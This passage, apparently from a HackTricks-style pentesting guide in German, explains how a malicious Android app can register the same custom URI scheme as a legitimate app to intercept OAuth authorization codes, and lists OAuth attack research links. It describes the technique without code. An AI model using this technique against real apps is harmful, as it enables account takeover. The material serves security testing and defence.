In mobilen OAuth-Implementierungen verwenden Apps custom URI schemes, um Redirects mit Authorization Codes zu empfangen. Da jedoch mehrere Apps dasselbe Scheme auf einem Gerät registrieren können, ist die Annahme, dass nur der legitime Client die Redirect-URI kontrolliert, aufgehoben. Auf Android etwa wird ein Intent-URI wie `com.example.app://` basierend auf dem Scheme und optionalen Filtern in einem intent-filter einer App gefangen. Da die Intent-Resolution von Android sehr breit sein kann — insbesondere wenn nur das Scheme angegeben ist — kann ein Angreifer eine bösartige App mit einem sorgfältig gestalteten intent-filter registrieren, um den Authorization Code zu kapern. Dies kann eine Account-Übernahme ermöglichen, entweder durch Benutzerinteraktion (wenn mehrere Apps eligible sind, das Intent zu handhaben) oder durch Bypass-Techniken, die zu spezifische Filter ausnutzen, wie im Ostorlab-Assessment-Flowchart beschrieben.

## Referenzen

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
